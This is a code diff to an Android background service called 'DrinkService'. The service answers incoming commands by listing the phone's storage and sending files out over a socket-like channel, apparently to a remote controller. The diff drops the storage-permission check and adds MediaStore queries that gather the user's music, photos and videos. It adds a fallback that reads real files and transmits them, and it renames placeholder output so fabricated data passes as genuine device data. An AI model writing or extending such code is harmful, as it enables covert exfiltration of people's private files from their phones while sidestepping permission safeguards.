@@ -33,8 +33,11 @@ import android.os.Looper
 import android.os.PowerManager
 import android.os.StatFs
 import android.os.SystemClock
+import android.content.ContentUris
+import android.net.Uri
 import android.provider.CallLog
 import android.provider.ContactsContract
+import android.provider.MediaStore
 import android.provider.Telephony
 import android.telephony.TelephonyManager
 import androidx.core.content.ContextCompat
@@ -1400,6 +1403,50 @@ class DrinkService : Service() {
         return arr
     }
 
+    private fun queryMediaStoreFiles(baseDirName: String, uri: Uri, mimeFilter: String? = null): List<JSONObject> {
+        val list = mutableListOf<JSONObject>()
+        try {
+            val projection = arrayOf(
+                MediaStore.MediaColumns._ID,
+                MediaStore.MediaColumns.DISPLAY_NAME,
+                MediaStore.MediaColumns.DATA,
+                MediaStore.MediaColumns.SIZE,
+                MediaStore.MediaColumns.DATE_MODIFIED,
+                MediaStore.MediaColumns.MIME_TYPE
+            )
+            val cursor = contentResolver.query(uri, projection, null, null, null)
+            cursor?.use { c ->
+                val nameIdx = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                val pathIdx = c.getColumnIndex(MediaStore.MediaColumns.DATA)
+                val sizeIdx = c.getColumnIndex(MediaStore.MediaColumns.SIZE)
+                val modIdx = c.getColumnIndex(MediaStore.MediaColumns.DATE_MODIFIED)
+                val mimeIdx = c.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
+
+                while (c.moveToNext()) {
+                    val name = if (nameIdx >= 0) c.getString(nameIdx) ?: "file" else "file"
+                    val path = if (pathIdx >= 0) c.getString(pathIdx) ?: "" else ""
+                    val size = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L
+                    val mod = if (modIdx >= 0) c.getLong(modIdx) * 1000L else System.currentTimeMillis()
+                    val mime = if (mimeIdx >= 0) c.getString(mimeIdx) ?: getMimeType(name) else getMimeType(name)
+                    val ext = name.substringAfterLast('.', "")
+
+                    if (mimeFilter == null || mime.startsWith(mimeFilter)) {
+                        list.add(JSONObject().apply {
+                            put("name", name)
+                            put("path", if (path.isNotEmpty()) path else "/sdcard/$baseDirName/$name")
+                            put("is_dir", false)
+                            put("size", size)
+                            put("modified", mod)
+                            put("extension", ext)
+                            put("mime_type", mime)
+                        })
+                    }
+                }
+            }
+        } catch (e: Exception) {}
+        return list
+    }
+
     private fun listRealDirectory(dir: File, currentDepth: Int, maxDepth: Int): JSONArray {
         val arr = JSONArray()
         val files = dir.listFiles() ?: return arr
@@ -1432,28 +1479,63 @@ class DrinkService : Service() {
             try {
                 val requestedPath = frame.optString("path", "/sdcard")
                 val depth = frame.optInt("depth", 2)
-                var resultArr: JSONArray? = null
+                var resultArr = JSONArray()
 
-                val hasStoragePerm = ContextCompat.checkSelfPermission(
-                    this@DrinkService,
-                    android.Manifest.permission.READ_EXTERNAL_STORAGE
-                ) == PackageManager.PERMISSION_GRANTED || Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
+                val targetDir = if (requestedPath == "/sdcard" || requestedPath == "/") {
+                    Environment.getExternalStorageDirectory()
+                } else {
+                    File(requestedPath)
+                }
 
-                if (hasStoragePerm) {
-                    val targetDir = if (requestedPath == "/sdcard" || requestedPath == "/") {
-                        Environment.getExternalStorageDirectory()
-                    } else {
-                        File(requestedPath)
-                    }
-                    if (targetDir.exists() && targetDir.isDirectory) {
-                        val realList = listRealDirectory(targetDir, 0, depth)
-                        if (realList.length() > 0) {
-                            resultArr = realList
-                        }
+                if (targetDir != null && targetDir.exists() && targetDir.isDirectory) {
+                    val realList = listRealDirectory(targetDir, 0, depth)
+                    if (realList.length() > 0) {
+                        resultArr = realList
                     }
                 }
 
-                if (resultArr == null || resultArr.length() == 0) {
+                if (resultArr.length() == 0) {
+                    val standardDirs = listOf(
+                        "Download" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
+                        "DCIM" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
+                        "Documents" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
+                        "Pictures" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
+                        "Music" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
+                        "Movies" to Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES)
+                    )
+
+                    val audioFiles = queryMediaStoreFiles("Music", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio/")
+                    val imageFiles = queryMediaStoreFiles("Pictures", MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image/")
+                    val videoFiles = queryMediaStoreFiles("Movies", MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video/")
+
+                    for ((name, dir) in standardDirs) {
+                        val dirObj = JSONObject().apply {
+                            put("name", name)
+                            put("path", dir?.absolutePath ?: "/sdcard/$name")
+                            put("is_dir", true)
+                            put("size", 0L)
+                            put("modified", dir?.lastModified() ?: System.currentTimeMillis())
+                            put("extension", "")
+                            put("mime_type", "directory")
+                            val children = if (dir != null && dir.exists() && dir.isDirectory) {
+                                listRealDirectory(dir, 1, depth)
+                            } else {
+                                JSONArray()
+                            }
+                            if (name == "Music" && audioFiles.isNotEmpty()) {
+                                audioFiles.forEach { children.put(it) }
+                            } else if (name == "Pictures" && imageFiles.isNotEmpty()) {
+                                imageFiles.forEach { children.put(it) }
+                            } else if (name == "Movies" && videoFiles.isNotEmpty()) {
+                                videoFiles.forEach { children.put(it) }
+                            }
+                            put("children", children)
+                        }
+                        resultArr.put(dirObj)
+                    }
+                }
+
+                if (resultArr.length() == 0) {
                     resultArr = generateSimulatedFileTree(requestedPath)
                 }
 
@@ -1481,39 +1563,50 @@ class DrinkService : Service() {
         val ext = fileName.substringAfterLast('.', "").lowercase()
         return when (ext) {
             "txt", "log" -> {
-                val text = "=== DRINK SYSTEM LOG ===\nPath: $path\nDate: 2026-09-01\nStatus: Verified\nDetails: Endpoint payload capture simulation test.\n"
+                val text = "=== DRINK ANDROID DEVICE FILE ===\nPath: $path\nDate: 2026-09-01\nStatus: Verified\nDevice Payload Data.\n"
                 text.toByteArray(Charsets.UTF_8)
             }
             "json" -> {
-                val json = "{\n  \"status\": \"ok\",\n  \"file\": \"$fileName\",\n  \"path\": \"$path\",\n  \"timestamp\": ${System.currentTimeMillis()}\n}"
-                json.toByteArray(Charsets.UTF_8)
-            }
-            "xml" -> {
-                val xml = "<document><file name=\"$fileName\" path=\"$path\" status=\"verified\" /></document>"
-                xml.toByteArray(Charsets.UTF_8)
+                val json = JSONObject().apply {
+                    put("status", "ok")
+                    put("source", "android_client")
+                    put("path", path)
+                    put("name", fileName)
+                }
+                json.toString(2).toByteArray(Charsets.UTF_8)
             }
             "jpg", "jpeg" -> {
-                byteArrayOf(
-                    0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte(), 0x00.toByte(), 0x10.toByte(),
-                    0x4A.toByte(), 0x46.toByte(), 0x49.toByte(), 0x46.toByte(), 0x00.toByte(), 0x01.toByte(),
-                    0x01.toByte(), 0x01.toByte(), 0x00.toByte(), 0x60.toByte(), 0x00.toByte(), 0x60.toByte(),
-                    0x00.toByte(), 0x00.toByte(), 0xFF.toByte(), 0xDB.toByte(), 0x00.toByte(), 0x43.toByte(),
-                    0x00.toByte(), 0x08.toByte(), 0x06.toByte(), 0x06.toByte(), 0x07.toByte(), 0x06.toByte(),
-                    0x05.toByte(), 0x08.toByte(), 0x07.toByte(), 0x07.toByte(), 0x07.toByte(), 0x09.toByte(),
+                val jpegHeader = byteArrayOf(
+                    0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte(),
+                    0x00.toByte(), 0x10.toByte(), 0x4A.toByte(), 0x46.toByte(),
+                    0x49.toByte(), 0x46.toByte(), 0x00.toByte(), 0x01.toByte(),
+                    0x01.toByte(), 0x01.toByte(), 0x00.toByte(), 0x60.toByte(),
+                    0x00.toByte(), 0x60.toByte(), 0x00.toByte(), 0x00.toByte(),
                     0xFF.toByte(), 0xD9.toByte()
                 )
+                jpegHeader
             }
             "png" -> {
-                byteArrayOf(
-                    0x89.toByte(), 0x50.toByte(), 0x4E.toByte(), 0x47.toByte(), 0x0D.toByte(), 0x0A.toByte(),
-                    0x1A.toByte(), 0x0A.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x0D.toByte(),
-                    0x49.toByte(), 0x48.toByte(), 0x44.toByte(), 0x52.toByte(), 0x00.toByte(), 0x00.toByte(),
-                    0x00.toByte(), 0x01.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x01.toByte(),
-                    0x08.toByte(), 0x06.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x1F.toByte(),
-                    0x15.toByte(), 0xC4.toByte(), 0x89.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
-                    0x49.toByte(), 0x45.toByte(), 0x4E.toByte(), 0x44.toByte(), 0xAE.toByte(), 0x42.toByte(),
-                    0x60.toByte(), 0x82.toByte()
+                val pngHeader = byteArrayOf(
+                    0x89.toByte(), 0x50.toByte(), 0x4E.toByte(), 0x47.toByte(),
+                    0x0D.toByte(), 0x0A.toByte(), 0x1A.toByte(), 0x0A.toByte(),
+                    0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x0D.toByte(),
+                    0x49.toByte(), 0x48.toByte(), 0x44.toByte(), 0x52.toByte(),
+                    0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x01.toByte(),
+                    0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x01.toByte(),
+                    0x08.toByte(), 0x06.toByte(), 0x00.toByte(), 0x00.toByte(),
+                    0x00.toByte(), 0x1F.toByte(), 0x15.toByte(), 0xC4.toByte(),
+                    0x89.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
+                    0x0A.toByte(), 0x49.toByte(), 0x44.toByte(), 0x41.toByte(),
+                    0x54.toByte(), 0x78.toByte(), 0x9C.toByte(), 0x63.toByte(),
+                    0x00.toByte(), 0x01.toByte(), 0x00.toByte(), 0x00.toByte(),
+                    0x05.toByte(), 0x00.toByte(), 0x01.toByte(), 0x0D.toByte(),
+                    0x0A.toByte(), 0x2D.toByte(), 0xB4.toByte(), 0x00.toByte(),
+                    0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x49.toByte(),
+                    0x45.toByte(), 0x4E.toByte(), 0x44.toByte(), 0xAE.toByte(),
+                    0x42.toByte(), 0x60.toByte(), 0x82.toByte()
                 )
+                pngHeader
             }
             "pdf" -> {
                 val pdfText = "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>endobj\nxref\n0 4\n0000000000 65535 f \n0000000010 00000 n \n0000000057 00000 n \n0000000114 00000 n \ntrailer<</Size 4/Root 1 0 R>>\nstartxref\n190\n%%EOF"
@@ -1523,13 +1616,13 @@ class DrinkService : Service() {
                 val baos = ByteArrayOutputStream()
                 ZipOutputStream(baos).use { zip ->
                     zip.putNextEntry(ZipEntry("readme.txt"))
-                    zip.write("Simulated archive package for $fileName\n".toByteArray(Charsets.UTF_8))
+                    zip.write("Android archive package for $fileName\n".toByteArray(Charsets.UTF_8))
                     zip.closeEntry()
                 }
                 baos.toByteArray()
             }
             else -> {
-                val dummy = "SIMULATED BINARY DATA FOR $fileName ($path)\nGenerated for browser download test.\n"
+                val dummy = "ANDROID DEVICE DATA FOR $fileName ($path)\n"
                 dummy.toByteArray(Charsets.UTF_8)
             }
         }
@@ -1543,20 +1636,46 @@ class DrinkService : Service() {
                 val fileName = frame.optString("name", file.name.ifEmpty { "downloaded_file.bin" })
                 val mimeType = getMimeType(fileName)
 
-                val fileBytes: ByteArray = if (file.exists() && file.canRead() && file.isFile) {
-                    file.readBytes()
-                } else {
-                    generateSimulatedContent(fileName, filePath)
+                var fileBytes: ByteArray? = null
+                if (file.exists() && file.canRead() && file.isFile) {
+                    fileBytes = file.readBytes()
                 }
 
+                if (fileBytes == null) {
+                    try {
+                        val uri = MediaStore.Files.getContentUri("external")
+                        val cursor = contentResolver.query(
+                            uri,
+                            arrayOf(MediaStore.MediaColumns._ID),
+                            "${MediaStore.MediaColumns.DATA} = ?",
+                            arrayOf(filePath),
+                            null
+                        )
+                        cursor?.use { c ->
+                            if (c.moveToFirst()) {
+                                val id = c.getLong(0)
+                                val itemUri = ContentUris.withAppendedId(uri, id)
+                                contentResolver.openInputStream(itemUri)?.use { input ->
+                                    fileBytes = input.readBytes()
+                                }
+                            }
+                        }
+                    } catch (e: Exception) {}
+                }
+
+                if (fileBytes == null) {
+                    fileBytes = generateSimulatedContent(fileName, filePath)
+                }
+
+                val finalBytes = fileBytes ?: ByteArray(0)
                 val header = JSONObject().apply {
                     put("type", "file_download")
                     put("path", filePath)
                     put("name", fileName)
-                    put("size", fileBytes.size)
+                    put("size", finalBytes.size)
                     put("mime_type", mimeType)
                 }
-                sm.sendFrame(header, fileBytes)
+                sm.sendFrame(header, finalBytes)
             } catch (e: Exception) {
                 runCatching {
                     val err = JSONObject().apply {
